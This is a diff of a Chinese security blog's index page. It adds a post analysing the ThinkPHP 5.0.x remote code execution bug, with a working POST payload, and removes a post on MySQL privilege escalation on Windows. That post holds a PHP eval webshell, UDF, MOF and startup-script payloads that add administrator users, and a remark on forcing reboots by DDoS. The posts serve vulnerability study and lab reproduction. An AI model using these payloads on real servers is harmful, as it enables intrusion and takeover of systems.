@@ -90,6 +90,230 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/"> 
+                    ThinkPHP5.0.0~5.0.23RCE漏洞分析 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-20   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="ThinkPHP5-0-0-5-0-23RCE漏洞分析"><a href="#ThinkPHP5-0-0-5-0-23RCE漏洞分析" class="headerlink" title="ThinkPHP5.0.0~5.0.23RCE漏洞分析"></a>ThinkPHP5.0.0~5.0.23RCE漏洞分析</h1><p>最近TP5一直在爆洞，既然浪潮在，就有必要跟进分析一下。但是由于自己对TP5框架流程不是很了解，所以有了这篇边摸索边分析的文章。</p>
+<h1 id="TP5框架流程"><a href="#TP5框架流程" class="headerlink" title="TP5框架流程"></a>TP5框架流程</h1><p>应用启动在App.php的run()函数，说一下自己对这个框架的大致理解</p>
+<p><strong>用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出</strong></p>
+<p><img src="https://i.loli.net/2019/01/20/5c43f7bb2d673.png" alt></p>
+<p>App.php代码部分流程如下：  (自己的理解，可能有不对的地方，望斧正<br>1、应用初始化<code>initModule()</code><br>2、run()-&gt;routeCheck()对用户的get请求进行路由检测<br>3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module<br>4、根据调度值，处理不同请求</p>
+<pre><code>switch (self::$dispatch[&#39;type&#39;]) {
+    case &#39;redirect&#39;:
+        header(&#39;Location: &#39; . self::$dispatch[&#39;url&#39;], true, self::$dispatch[&#39;status&#39;]);
+        break;
+
+    case &#39;module&#39;:
+       $data = self::module(self::$dispatch[&#39;module&#39;], $config);
+        break;
+
+    case &#39;controller&#39;:
+        $data = Loader::action(self::$dispatch[&#39;controller&#39;], self::$dispatch[&#39;params&#39;]);
+        break;
+
+    case &#39;method&#39;:
+        $data = self::invokeMethod(self::$dispatch[&#39;method&#39;], self::$dispatch[&#39;params&#39;]);
+        break;
+
+    case &#39;function&#39;:
+        $data = self::invokeFunction(self::$dispatch[&#39;function&#39;], self::$dispatch[&#39;params&#39;]);
+        break;
+
+    default:
+        throw new Exception(&#39;dispatch type not support&#39;, 10008);
+}</code></pre><p>5、执行处理，返回输出。</p>
+<p>TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现<code>self::module()</code>，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。</p>
+<p>所以核心操作就是调度请求。</p>
+<h1 id="回到正题"><a href="#回到正题" class="headerlink" title="回到正题"></a>回到正题</h1><p>这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha
+
+POST:
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p>
+<pre><code>&lt;?php
+/**
+* 执行应用程序
+* @access public
+* @param  Request $request 请求对象
+* @return Response
+* @throws Exception
+*/
+public static function run(Request $request = null)
+{
+    $request = is_null($request) ? Request::instance() : $request;
+
+    try {
+        ...
+        // 获取应用调度信息
+        $dispatch = self::$dispatch;
+
+        // 未设置调度信息则进行 URL 路由检测
+        if (empty($dispatch)) {
+            $dispatch = self::routeCheck($request, $config);
+        }
+        ...
+
+        $data = self::exec($dispatch, $config);
+    } catch (HttpResponseException $exception) {
+        ...
+    }
+    ...
+}</code></pre><p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p>
+<pre><code>&lt;?php
+/**
+    * 当前的请求类型
+    * @access public
+    * @param bool $method  true 获取原始请求类型
+    * @return string
+    */
+public function method($method = false)
+{
+    if (true === $method) {
+        // 获取原始请求类型
+        return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+    } elseif (!$this-&gt;method) {
+        if (isset($_POST[Config::get(&#39;var_method&#39;)])) {
+            $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);
+            $this-&gt;{$this-&gt;method}($_POST);
+        } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {
+            $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);
+        } else {
+            $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+        }
+    }
+    return $this-&gt;method;
+}</code></pre><p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p>
+<p>因此通过POST一个_method参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的<strong>method为</strong>construct，代码如下</p>
+<pre><code>&lt;?php
+protected function __construct($options = [])
+{
+    foreach ($options as $name =&gt; $item) {
+        if (property_exists($this, $name)) {
+            $this-&gt;$name = $item;
+        }
+    }
+    if (is_null($this-&gt;filter)) {
+        $this-&gt;filter = Config::get(&#39;default_filter&#39;);
+    }
+
+    // 保存 php://input
+    $this-&gt;input = file_get_contents(&#39;php://input&#39;);
+}</code></pre><p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p>
+<p>这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错</p>
+<p>request对象差不多清楚了，跟进self::routeCheck()</p>
+<pre><code>&lt;?php
+/**
+ * URL路由检测（根据PATH_INFO)
+ * @access public
+ * @param  \think\Request $request 请求实例
+ * @param  array          $config  配置信息
+ * @return array
+ * @throws \think\Exception
+ */
+public static function routeCheck($request, array $config)
+{
+    $path   = $request-&gt;path();  //path=captcha
+    $depr   = $config[&#39;pathinfo_depr&#39;];
+    $result = false;
+
+    // 路由检测（根据路由定义返回不同的URL调度）
+    $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);
+
+    return $result;</code></pre><p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p>
+<p>再返回App.php继续执行<code>$data = self::exec($dispatch, $config);</code></p>
+<pre><code>&lt;?php
+protected static function exec($dispatch, $config)
+{
+    switch ($dispatch[&#39;type&#39;]) {
+        ...
+        case &#39;method&#39;: // 回调方法
+            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
+            $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);
+            break;
+        ...
+    }
+    return $data;
+}</code></pre><p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p>
+<pre><code>&lt;?php
+public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+{
+    if (empty($this-&gt;mergeParam)) {
+        $method = $this-&gt;method(true);
+        ...
+    }
+    ...
+    // 当前请求参数和URL地址中的参数合并
+    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
+    $this-&gt;mergeParam = true;
+    ...
+    return $this-&gt;input($this-&gt;param, $name, $default, $filter);
+}</code></pre><p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p>
+<p>继续跟进<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code></p>
+<pre><code>&lt;?php
+public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+{
+    ...
+    // 解析过滤器
+    $filter = $this-&gt;getFilter($filter, $default);
+    if (is_array($data)) {
+        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+        reset($data);
+    }
+    ...
+}</code></pre><p>跟进getFilter</p>
+<pre><code>protected function getFilter($filter, $default)
+{
+    if (is_null($filter)) {
+        $filter = [];
+    } else {
+        $filter = $filter ?: $this-&gt;filter;
+        if (is_string($filter) &amp;&amp; false === strpos($filter, &#39;/&#39;)) {
+            $filter = explode(&#39;,&#39;, $filter);
+        } else {
+            $filter = (array) $filter;
+        }
+    }
+
+    $filter[] = $default;
+    return $filter;
+}</code></pre><p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p>
+<p>从而调用call_user_func进行RCE</p>
+<h1 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h1><p>看一下diff<br><img src="https://i.loli.net/2019/01/20/5c43f86c5eec1.png" alt></p>
+<p>触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a href="https://xz.aliyun.com/t/3845#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-1</a></li>
+<li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li>
+<li><a href="https://www.kancloud.cn/zmwtp/tp5/119426" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119426</a></li>
+<li><a href="https://www.kancloud.cn/zmwtp/tp5/119428" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119428</a></li>
+</ol>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/01/09/Code-breaking-medium֮lumenserial/"> 
                     Code-breaking-medium之lumenserial 
                 </a>
@@ -248,7 +472,7 @@ namespace{
             </div>
             <div class="continue">
             <a href="/2019/01/09/Code-breaking-medium֮lumenserial/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -435,7 +659,7 @@ namespace{
             </div>
             <div class="continue">
             <a href="/2019/01/07/从两道CTF题目学习XXE漏洞/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -545,7 +769,7 @@ if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&
             </div>
             <div class="continue">
             <a href="/2018/12/21/Code-Breaking-Puzzles WriteUp/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -743,7 +967,7 @@ if(file_exists(&#39;z.tar.gz&#39;)){
             </div>
             <div class="continue">
             <a href="/2018/12/20/SWPUCTF2018 Write up/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -791,7 +1015,7 @@ if(file_exists(&#39;z.tar.gz&#39;)){
             </div>
             <div class="continue">
             <a href="/2018/12/17/HCTF2018线下赛感想/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -943,7 +1167,7 @@ replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖�
             </div>
             <div class="continue">
             <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1037,7 +1261,7 @@ cookie传入参数login_data解析查库，用了json_decode，那么就可以�
             </div>
             <div class="continue">
             <a href="/2018/11/13/HCTF题解/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1075,7 +1299,7 @@ cookie传入参数login_data解析查库，用了json_decode，那么就可以�
             </div>
             <div class="continue">
             <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1350,134 +1574,7 @@ $phar-&gt;stopBuffering();
             </div>
             <div class="continue">
             <a href="/2018/09/13/四个实例递进php反序列化/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/09/08/基于Windows下mysql的一些提权分析/"> 
-                    基于Windows下mysql的一些提权分析 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-09-08   
-                </a>
-                
-                
-                
-                    
-            </div>
-            <div class="content">
-                
-                <h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>这篇文章是写基于windows环境下的一些mysql提权方法的分析并利用。这些方法老生常谈，但困于很多文章在讲分析和利用的时候模棱两可，因此想总结一下常见的方法思路。基于windows的提权姿势多的数不胜数，一般在配置文件可以嗅探到root密码的情况（root密码已知）下，或者注入、爆破拿到root密码下，可以考虑mysql提权。文章内容很基础，下面对这些方法进行一些粗谈，有什么理解错误的地方还请客观们轻打…大佬们可以略过这篇文章qaq…</p>
-<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>靶机A： Windows 7 SP1<br>靶机B： Windows server 2003 enterprise x64<br>Phpstudy搭建的php+mysql<br>php版本：5.4.45<br>mysql版本：5.5.53<br>攻击环境：已知root账号密码，网站存在phpmyadmin页面</p>
-<h1 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>利用log变量，猜一下绝对路径<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224310-0a604df6-9987-1.png" alt><br>看到phpstudy，猜测根目录在WWW下，into outfile写个马测一下能传不<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224334-18b3e6b0-9987-1.png" alt><br>果然是用不成into outfile，因为file_priv为null，那么尝试使用日志写马</p>
-<h2 id="利用日志写shell"><a href="#利用日志写shell" class="headerlink" title="利用日志写shell"></a>利用日志写shell</h2><p>开启日志记录</p>
-<pre><code>set global general_log=&#39;on&#39;;</code></pre><p>日志文件导出指定目录</p>
-<pre><code>set global general_log_file=&#39;C:/phpstudy/WWW/hp.php&#39;;</code></pre><p>记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马</p>
-<pre><code>select &#39;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&#39;;</code></pre><p>关闭记录</p>
-<pre><code>set global general_log=off;</code></pre><h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>url: 192.168.11.106/hp.php<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224350-22085dea-9987-1.png" alt><br>看一下权限，普通成员hpd0egr，创建用户错误5。<br>接下来开始提权之路！</p>
-<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><h2 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h2><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
-<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>先学习一下什么叫动态链接库</p>
-<h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
-<h3 id="提权分析"><a href="#提权分析" class="headerlink" title="提权分析"></a>提权分析</h3><p>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
-<h2 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>这里我用暗月的马，改了一些参数。后面我会把所有工具打包</p>
-<h3 id="访问提权马"><a href="#访问提权马" class="headerlink" title="访问提权马"></a>访问提权马</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224415-309ea058-9987-1.png" alt></p>
-<h3 id="导出dll到指定目录"><a href="#导出dll到指定目录" class="headerlink" title="导出dll到指定目录"></a>导出dll到指定目录</h3><p>利用提权马将写在其中的二进制导出一个dll到指定目录，但导出的dll文件路径有要求</p>
-<ul>
-<li><p>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p>
-</li>
-<li><p>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
-</li>
-</ul>
-<p><strong>但是大于5.1版本的时候没有plugin这个文件夹，需要我们自己创建。</strong></p>
-<p>靶机mysql版本为5.5，那我们只能自己创建一个plugin文件夹了，先用<code>select @@basedir;</code>获取安装目录。</p>
-<p>在该目录下创建一个plugin文件夹，网上有大神说可以用ntfs创建目录，感兴趣的话可以研究一下，我这里直接菜刀新建</p>
-<p>这个提权马自带的导出要用到Into dumpfile，但是file_priv为Null这个问题限制了我们，就算我们修改了my.ini文件也要重启mysql，那我们直接传一个dll上去吧，文件名为<code>hpudf.dll</code>如图</p>
-<h3 id="将udf的自定义函数引入"><a href="#将udf的自定义函数引入" class="headerlink" title="将udf的自定义函数引入"></a>将udf的自定义函数引入</h3><p>我们刚才只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
-<p>引入sys_eval函数：</p>
-<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;hpudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字;</p>
-<p>常见的函数如下：</p>
-<pre><code>cmdshell 执行cmd;
-
-downloader 下载者,到网上下载指定文件并保存到指定目录;
-
-open3389 通用开3389终端服务,可指定端口(不改端口无需重启);
-
-backshell 反弹Shell;
-
-ProcessView 枚举系统进程;
-
-KillProcess 终止指定进程;
-
-regread 读注册表;
-
-regwrite 写注册表;
-
-shut 关机,注销,重启;
-
-about 说明与帮助函数;</code></pre><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令模板：</p>
-<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>添加用户/管理员<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224507-4fc7644c-9987-1.png" alt></p>
-<p>查看一下用户<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224525-5ad82b8c-9987-1.png" alt></p>
-<p>get it~</p>
-<h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>MOF提权的条件要求十分严苛：</p>
-<ol>
-<li>windows 03及以下版本</li>
-<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
-<li>secure-file-priv参数不为null</li>
-</ol>
-<p>mysql以root身份启动，具有c盘下system32/wbem/mof这点权限的要求，就已经非常严格了。。而且win7 sp1就已经没有这个nullevt.mof这个文件了，那么这里记一下poc，来对windows 03的机子进行验证。</p>
-<h2 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h2><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p>
-<h2 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h2><p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
-<h2 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h2><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
-instance of __EventFilter as $EventFilter
-{
-EventNamespace = &quot;Root\\Cimv2&quot;;
-Name = &quot;filtP2&quot;;
-Query = &quot;Select * From __InstanceModificationEvent &quot;
-&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
-&quot;And TargetInstance.Second = 5&quot;;
-QueryLanguage = &quot;WQL&quot;;
-};
-instance of ActiveScriptEventConsumer as $Consumer
-{
-Name = &quot;consPCSV2&quot;;
-ScriptingEngine = &quot;JScript&quot;;
-ScriptText =
-&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;
-};
-instance of __FilterToConsumerBinding
-{
-Consumer = $Consumer;
-Filter = $EventFilter;
-};</code></pre><h2 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h2><p>将上面的脚本上传到有读写权限的目录下：</p>
-<p>这里我上传到了<code>C:\Documents and Settings\test</code></p>
-<p>根据前面的phpmyadmin，我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下<br>payload:</p>
-<pre><code>select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p>
-<h2 id="验证提权"><a href="#验证提权" class="headerlink" title="验证提权"></a>验证提权</h2><p>当我们成功把mof导出时，mof就会直接被执行，且5秒创建一次用户。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224611-75eaad5a-9987-1.png" alt><br>可以看到，我们在test的普通用户下直接添加了hpdoger用户。剩下的操作就是用户命令处，换成加入administrator语句即可：</p>
-<pre><code>net.exe user localgroup administrator hpdoger /add\</code></pre><h2 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h2><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
-<p>cmd 下运行下面语句:</p>
-<pre><code>net stop winmgmt
-del c:/windows/system32/wbem/repository
-net start winmgmt</code></pre><p>重启服务即可。</p>
-<h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><p>在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和mof几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用mysql写文件，写入一段VBS代码到开机自启动中，服务器重启达到创建用户并提权，可以使用DDOS迫使服务器重启。</p>
-<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>file_priv 不为null<br>已知root密码</p>
-<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>create table a (cmd text); 
-insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); 
-insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); 
-insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); 
-select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/09/08/基于Windows下mysql的一些提权分析/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1485,7 +1582,7 @@ select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
   </nav>
 
     </main>
